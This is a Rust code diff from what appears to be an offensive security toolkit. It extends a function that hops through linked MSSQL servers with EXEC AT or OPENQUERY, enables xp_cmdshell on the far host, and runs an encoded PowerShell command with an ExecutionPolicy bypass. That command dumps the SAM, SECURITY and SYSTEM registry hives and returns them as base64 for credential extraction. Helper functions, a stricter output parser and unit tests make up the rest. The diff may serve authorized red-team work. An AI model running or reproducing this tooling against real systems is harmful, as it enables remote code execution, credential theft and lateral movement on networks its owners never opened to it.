@@ -283,6 +283,65 @@ pub async fn mssql_openquery(args: &Value) -> Result<ToolOutput> {
     mssql_query(mssql_from_args(args)?, &full_query).await
 }
 
+/// Which source-side wrapper to use when hopping a query onto a linked SQL
+/// server. `ExecAt` needs `RPC OUT = ON` on the link; `OpenQuery` runs via
+/// the link's stored `sp_addlinkedsrvlogin` mapping and works when RPC is
+/// disabled. `mssql_far_host_secretsdump` tries them in that order.
+#[derive(Clone, Copy)]
+enum HopStyle {
+    ExecAt,
+    OpenQuery,
+}
+
+impl std::fmt::Display for HopStyle {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            HopStyle::ExecAt => f.write_str("EXEC AT"),
+            HopStyle::OpenQuery => f.write_str("OPENQUERY"),
+        }
+    }
+}
+
+/// Build the SQL that enables `xp_cmdshell` on the far side via the chosen
+/// hop style. Idempotent — safe to re-run when it's already on.
+fn build_hive_enable_hop(linked_server: &str, style: HopStyle) -> String {
+    match style {
+        HopStyle::ExecAt => format!(
+            "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
+             EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
+        ),
+        // OPENQUERY's inner query must return a rowset — trailing `SELECT 1`
+        // satisfies that after the configure/reconfigure has run. All inner
+        // single quotes are doubled per T-SQL string escaping.
+        HopStyle::OpenQuery => format!(
+            "SELECT * FROM OPENQUERY([{linked_server}], \
+             'SET FMTONLY OFF; sp_configure ''''show advanced options'''', 1; RECONFIGURE; \
+             EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE; SELECT 1 AS ok');"
+        ),
+    }
+}
+
+/// Build the SQL that runs `xp_cmdshell '<ps_cmd>'` on the far side via the
+/// chosen hop style. `ps_cmd` is expected to be free of single quotes (our
+/// callers use `-EncodedCommand <base64>`, whose alphabet excludes `'`) so
+/// no additional escaping of the inner command is required.
+fn build_hive_dump_hop(ps_cmd: &str, linked_server: &str, style: HopStyle) -> String {
+    match style {
+        HopStyle::ExecAt => {
+            format!("EXEC ('xp_cmdshell ''{ps_cmd}''') AT [{linked_server}];")
+        }
+        // Two layers of T-SQL string-literal escaping between us and the
+        // xp_cmdshell arg: the outer OPENQUERY literal (single quotes → '')
+        // and the inner `xp_cmdshell 'cmd'` literal (single quotes → ''''
+        // after the OPENQUERY layer). Base64 has no single quotes so `ps_cmd`
+        // itself passes through untouched.
+        HopStyle::OpenQuery => format!(
+            "SELECT * FROM OPENQUERY([{linked_server}], \
+             'SET FMTONLY OFF; EXEC xp_cmdshell ''''{ps_cmd}''''');"
+        ),
+    }
+}
+
 /// Delimiter markers embedded in the PowerShell hive-exfil payload.
 ///
 /// Extracted as constants so the parser and the payload builder can't drift.
@@ -342,14 +401,22 @@ fn ps_encoded_command(script: &str) -> String {
     base64::engine::general_purpose::STANDARD.encode(utf16)
 }
 
+/// True when `c` is in the standard base64 alphabet (`A-Za-z0-9+/=`).
+fn is_base64_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='
+}
+
 /// Extract the base64 payload framed by `begin` and `end` marker lines.
 ///
-/// Whitespace-tolerant on both the marker lines and the payload — the
-/// payload is joined without any newlines to reconstruct the single-line
-/// base64 the PowerShell payload emits (impacket's mssqlclient adds column
-/// headers, row separators, and its own trailing linefeed which we must
-/// strip). Returns `None` if either marker is missing or the payload is
-/// empty.
+/// impacket's mssqlclient and xp_cmdshell wrap a large base64 blob in various
+/// ways: column header ("output"), separator row ("----"), row-count trailer
+/// ("(1 rows affected)"), the string "NULL" for a null column, and CR/LF
+/// endings. All of those contain characters that aren't in the base64
+/// alphabet — so we drop any line that isn't a clean base64 chunk after
+/// trimming. That's stricter than "strip empty lines and join": a "NULL"
+/// separator (all-uppercase, all base64-alphabet) would previously slip
+/// through and corrupt the decoded hive. Returns `None` if either marker is
+/// missing or the payload is empty.
 fn extract_hive_b64(output: &str, begin: &str, end: &str) -> Option<String> {
     let start = output.find(begin)?;
     let after_begin = &output[start + begin.len()..];
@@ -359,6 +426,7 @@ fn extract_hive_b64(output: &str, begin: &str, end: &str) -> Option<String> {
         .lines()
         .map(str::trim)
         .filter(|s| !s.is_empty())
+        .filter(|s| *s != "NULL" && s.chars().all(is_base64_char))
         .collect::<Vec<_>>()
         .join("");
     if joined.is_empty() {
@@ -423,50 +491,64 @@ pub async fn mssql_far_host_secretsdump(args: &Value) -> Result<ToolOutput> {
     let linked_server = required_str(args, "linked_server")?;
     let impersonate_user = optional_str(args, "impersonate_user");
 
-    // Enable xp_cmdshell on the far side first — idempotent, safe to run
-    // even when it's already on.
-    let enable_hop = format!(
-        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
-         EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
-    );
-    let enable_full = wrap_execute_as(&enable_hop, impersonate_user);
-    let enable_out = mssql_query(mssql_from_args(args)?, &enable_full).await?;
-
     let script = build_hive_dump_ps_script();
     let encoded = ps_encoded_command(&script);
     let ps_cmd = format!("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}");
 
-    let dump_hop = format!("EXEC ('xp_cmdshell ''{ps_cmd}''') AT [{linked_server}];");
-    let dump_full = wrap_execute_as(&dump_hop, impersonate_user);
-    let dump_out = mssql_query(mssql_from_args(args)?, &dump_full).await?;
+    // Try the EXEC-AT hop first — it's the standard cross-forest link path.
+    // If the link is configured without `RPC OUT = ON` (or otherwise refuses
+    // ad-hoc EXEC) but still permits OPENQUERY via a stored login mapping,
+    // fall back to OPENQUERY. Both paths are noisy but only one needs to
+    // survive to land the hives.
+    let mut attempts: Vec<(HopStyle, ToolOutput, ToolOutput)> = Vec::new();
+    let mut hives: Option<FarHostHives> = None;
 
-    // If the hive markers aren't in the output, hand the raw xp_cmdshell
-    // stdout+stderr back so the caller can see the actual failure (e.g.
-    // "Access is denied" from reg save when SQL runs as a non-privileged
-    // service account).
-    let combined = dump_out.combined_raw();
-    let hives = match parse_hive_dump_output(&combined) {
-        Ok(h) => h,
-        Err(e) => {
-            let msg = format!(
-                "mssql_far_host_secretsdump: hive extraction failed — {e:?}\n\
-                 xp_cmdshell enable step exit={:?} success={}\n\
-                 xp_cmdshell dump step exit={:?} success={}\n\n\
-                 --- enable stdout ---\n{}\n--- dump combined ---\n{}",
+    for style in [HopStyle::ExecAt, HopStyle::OpenQuery] {
+        // Enable xp_cmdshell on the far side — idempotent, safe to re-run.
+        let enable_hop = build_hive_enable_hop(linked_server, style);
+        let enable_full = wrap_execute_as(&enable_hop, impersonate_user);
+        let enable_out = mssql_query(mssql_from_args(args)?, &enable_full).await?;
+
+        let dump_hop = build_hive_dump_hop(&ps_cmd, linked_server, style);
+        let dump_full = wrap_execute_as(&dump_hop, impersonate_user);
+        let dump_out = mssql_query(mssql_from_args(args)?, &dump_full).await?;
+
+        let combined = dump_out.combined_raw();
+        if let Ok(h) = parse_hive_dump_output(&combined) {
+            hives = Some(h);
+            break;
+        }
+        attempts.push((style, enable_out, dump_out));
+    }
+
+    let Some(hives) = hives else {
+        // Both paths failed — surface every attempt's raw output so the
+        // caller can see which one got closest (e.g. link permissions
+        // vs. `reg save` "Access is denied" on the far host).
+        let mut msg =
+            String::from("mssql_far_host_secretsdump: hive extraction failed on all hop styles");
+        for (style, enable_out, dump_out) in &attempts {
+            msg.push_str(&format!(
+                "\n\n=== {style} ===\n\
+                 enable exit={:?} success={}\n\
+                 dump   exit={:?} success={}\n\
+                 --- enable combined ---\n{}\n\
+                 --- dump combined ---\n{}",
                 enable_out.exit_code,
                 enable_out.success,
                 dump_out.exit_code,
                 dump_out.success,
-                enable_out.stdout,
-                combined,
-            );
-            return Ok(ToolOutput {
-                stdout: String::new(),
-                stderr: msg,
-                exit_code: dump_out.exit_code,
-                success: false,
-            });
+                enable_out.combined_raw(),
+                dump_out.combined_raw(),
+            ));
         }
+        let last_exit = attempts.last().and_then(|(_, _, d)| d.exit_code);
+        return Ok(ToolOutput {
+            stdout: String::new(),
+            stderr: msg,
+            exit_code: last_exit,
+            success: false,
+        });
     };
 
     // Save the decoded hives to a unique temp dir per-invocation so
@@ -521,8 +603,9 @@ pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
 #[cfg(test)]
 mod tests {
     use super::{
-        build_hive_dump_ps_script, build_linked_exec_hop, extract_hive_b64, mssql_auth_args,
-        parse_hive_dump_output, ps_encoded_command, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END,
+        build_hive_dump_hop, build_hive_dump_ps_script, build_hive_enable_hop,
+        build_linked_exec_hop, extract_hive_b64, mssql_auth_args, parse_hive_dump_output,
+        ps_encoded_command, HopStyle, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END,
         HIVE_MARK_SECURITY_BEGIN, HIVE_MARK_SECURITY_END, HIVE_MARK_SYSTEM_BEGIN,
         HIVE_MARK_SYSTEM_END,
     };
@@ -597,6 +680,41 @@ mod tests {
         // rejoin so the base64 decodes cleanly.
         let out = format!(
             "{begin}\n   \nAAAA\n\nBBBB\n{end}",
+            begin = HIVE_MARK_SAM_BEGIN,
+            end = HIVE_MARK_SAM_END,
+        );
+        assert_eq!(
+            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END).as_deref(),
+            Some("AAAABBBB")
+        );
+    }
+
+    #[test]
+    fn extract_hive_b64_rejects_mssqlclient_row_noise() {
+        // mssqlclient can splice in a "NULL" row, a `(1 rows affected)`
+        // trailer, or a "----" divider between base64 rows. Before the
+        // per-line base64-alphabet filter, "NULL" (all base64-alphabet chars)
+        // would slip through and corrupt the decoded hive. All three noise
+        // shapes must be dropped so the surviving base64 concatenates
+        // cleanly.
+        let out = format!(
+            "{begin}\nAAAA\n----\nBBBB\nNULL\nCCCC\n(1 rows affected)\nDDDD\n{end}",
+            begin = HIVE_MARK_SAM_BEGIN,
+            end = HIVE_MARK_SAM_END,
+        );
+        assert_eq!(
+            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END).as_deref(),
+            Some("AAAABBBBCCCCDDDD")
+        );
+    }
+
+    #[test]
+    fn extract_hive_b64_survives_crlf_line_endings() {
+        // Windows/MSSQL side sends CRLF; str::lines strips the LF, trim strips
+        // the CR. Sanity-check that the extractor still concatenates cleanly
+        // — a stray CR making it into the joined blob would break base64.
+        let out = format!(
+            "{begin}\r\nAAAA\r\nBBBB\r\n{end}",
             begin = HIVE_MARK_SAM_BEGIN,
             end = HIVE_MARK_SAM_END,
         );
@@ -761,6 +879,54 @@ mod tests {
     fn linked_exec_hop_quote_free_query_unchanged() {
         let hop = build_linked_exec_hop("SELECT @@SERVERNAME AS srv;", "SQL02");
         assert_eq!(hop, "EXEC ('SELECT @@SERVERNAME AS srv;') AT [SQL02];");
+    }
+
+    // ── far-host hop-style variants ────────────────────────────────────
+
+    #[test]
+    fn hive_enable_hop_exec_at_matches_configure_form() {
+        let hop = build_hive_enable_hop("SQL02", HopStyle::ExecAt);
+        assert!(hop.starts_with("EXEC ('sp_configure"));
+        assert!(hop.ends_with("AT [SQL02];"));
+        assert!(hop.contains("''xp_cmdshell''"));
+        // Balanced outer-literal quotes: every inner single quote is doubled.
+        assert_eq!(hop.matches('\'').count() % 2, 0);
+    }
+
+    #[test]
+    fn hive_enable_hop_openquery_wraps_and_appends_select() {
+        // OPENQUERY needs its inner query to return a rowset — the trailing
+        // `SELECT 1 AS ok` is what makes the wrapper legal after RECONFIGURE.
+        let hop = build_hive_enable_hop("SQL02", HopStyle::OpenQuery);
+        assert!(hop.starts_with("SELECT * FROM OPENQUERY([SQL02],"));
+        assert!(hop.contains("SET FMTONLY OFF"));
+        assert!(hop.contains("SELECT 1 AS ok"));
+        // Two layers of literal escaping: the inner `sp_configure 'x'` needs
+        // to appear as `sp_configure ''''x''''` after both layers.
+        assert!(hop.contains("sp_configure ''''xp_cmdshell''''"));
+    }
+
+    #[test]
+    fn hive_dump_hop_exec_at_wraps_xp_cmdshell() {
+        let hop = build_hive_dump_hop("powershell -EncodedCommand ABC=", "SQL02", HopStyle::ExecAt);
+        assert_eq!(
+            hop,
+            "EXEC ('xp_cmdshell ''powershell -EncodedCommand ABC=''') AT [SQL02];"
+        );
+    }
+
+    #[test]
+    fn hive_dump_hop_openquery_double_escapes_inner_xp_cmdshell() {
+        let hop = build_hive_dump_hop(
+            "powershell -EncodedCommand ABC=",
+            "SQL02",
+            HopStyle::OpenQuery,
+        );
+        // Outer OPENQUERY literal ('...') requires xp_cmdshell's own quotes
+        // to be doubled TWICE (once per string layer) — 4 apostrophes each
+        // side of the inner argument.
+        assert!(hop.contains("EXEC xp_cmdshell ''''powershell -EncodedCommand ABC=''''"));
+        assert!(hop.starts_with("SELECT * FROM OPENQUERY([SQL02],"));
     }
 
     // --- mssql_from_args required fields ---
